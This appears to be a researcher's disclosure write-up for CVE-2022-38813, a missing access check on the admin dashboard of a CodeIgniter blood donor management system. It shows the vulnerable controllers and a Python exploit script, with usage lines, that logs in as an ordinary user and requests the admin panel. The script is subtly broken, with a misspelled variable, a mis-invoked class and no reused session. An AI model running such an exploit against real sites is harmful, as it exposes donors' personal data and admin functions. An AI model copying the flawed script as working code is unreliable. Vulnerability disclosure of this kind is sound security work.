# CVE-2022-38813

Veritical Privilege Escalation via user parameter in Blood Donor Management System Using Codeigniter v 1.0

![CVE-2022-38813](https://user-images.githubusercontent.com/65374016/197400348-7c063a8f-3f30-4683-8839-97d6b52f33e5.png)


# Technical description:

Blood Donor Management System 1.0 does not properly restrict access to admin/dashboard.php, which allows attackers to access all data of users, delete the users, add and manage Blood Group, and Submit Report.

## Affected components - Source Code

in following Source Code we can see that user/dashboard does not properly restrict an user paramters so attacker can change that paramter to admin parameter and gain access the admin account

Vulnerable Page - Dashboard.php in User & Dashboard.php in Admin

```php
  // Dashboard.php in User
class Dashboard extends CI_Controller
{
	//Validating login
	function __construct()
	{
		parent::__construct();
		if (!$this->session->userdata('uid'))
			redirect('user/login');
	}


	public function index()
	{
		$this->load->view('user/dashboard');
	}
}

```

###### Change user paramter to admin in url ie: localhost/blood/user/dashboard to localhost/blood/admin/dashboard

```php
  // Dashboard.php in Admin
<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Dashboard extends CI_Controller
{

	public function index()
	{
		$this->load->model('admin/Dashboard_Model', 'adminn');
		$totalusercount = $this->adminn->totalusercount();
		$totalbloodgroupcount = $this->adminn->totalbloodgroupcount();
		$this->load->view('admin/dashboard', ['totalusercount' => $totalusercount, 'totalbloodgroupcount' => $totalbloodgroupcount]);
	}
}


```

# Exploit

```python
import argparse
import requests
from termcolor import cprint
import sys
from bs4 import *
color = "green"
cprint("[+] CVE-2022-38813 Authenticated Privilege Escalation in Blood Donor Management System v1.0", color)
cprint("[+] Author: RashidKhan Pathan aka iHexCoder", color)
cprint("[!] Usage: run exploit.py username password payload", color)
cprint("[!] Example: python3 exploit.py admin johndoe@gmail.com Test@123", color)


class PrivilegeEscalation:
    color = "green"

    def __init__(self, username, password, payload):
        self.username = username
        self.password = password
        self.paylaod = payload

    def authentication(self):
        color = "green"
        cprint("[+] Authenticating User", color)
        cprint("[+] Username: " + args.username, color)
        cprint("[+] Password: " + args.password, color)
        cprint("[+] Payload: " + args.payload, color)

        login_url = "http://localhost/blood/user/login"

        data = {
            "email": args.username,
            "password": args.password
        }
        login_response = requests.post(login_url, data=data)

        cprint("[+] Exploiting...Started", color)
        if "/user/login" in login_response.url:
            cprint("[+] Credentials is not Valid", "red")
            sys.exit(1)
        else:
            cprint("[+] Authenticated Successfully as a Normal User ", color)
            cprint("[+] Normal User URL Endpoint " + login_response.url, color)

        url = args.payload
        if args.payload != "admin":
            cprint("[+] Please Add Valid Payload", "red")
            sys.exit(1)

        response = requests.get(f"http://localhost/blood/{url}/dashboard")
        cprint("[+] Exploit Compleated", color)
        cprint("[+] Accessed Admin Panel Successfully " + response.url, color)
        cprint("[+] Copy the URL and Replace with user/dashboard URL with " +  esponse.url, color)
        cprint("[+] After Replacing it You Should see the Bypassed Admin Panel", color)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("username", help="Please Add Username", type=str)
    parser.add_argument("password", help="Please Add Password", type=str)
    parser.add_argument("payload", help="Please Add Password", type=str)
    args = parser.parse_args()

    privilegeEscalation = PrivilegeEscalation
    privilegeEscalation.authentication((args.username, args.password, args.payload))

```

# CVE-2022-38813.py usage -

```sh
# Changes The Vulnerable user paramter from url to escalate privileges normal user to admin -
python3 CVE-2022-38813.py <username> <password> <payload>
```

## Example -

```sh
python CVE-2022-38813.py johndoe@gmail.com Test@123 admin
```

# Exploit Proof of concept (Poc) -

![Screenshot 2022-10-23 194928](https://user-images.githubusercontent.com/65374016/197400391-1c07de7d-3433-4d3e-a35a-952f9efc1cfb.png)


# References -

Software Link: https://phpgurukul.com/blood-donor-management-system-using-codeigniter

# Discovered & Developed by -

RashidKhan Pathan (iHexCoder), 9 September 2022.
Twitter: @itRashid
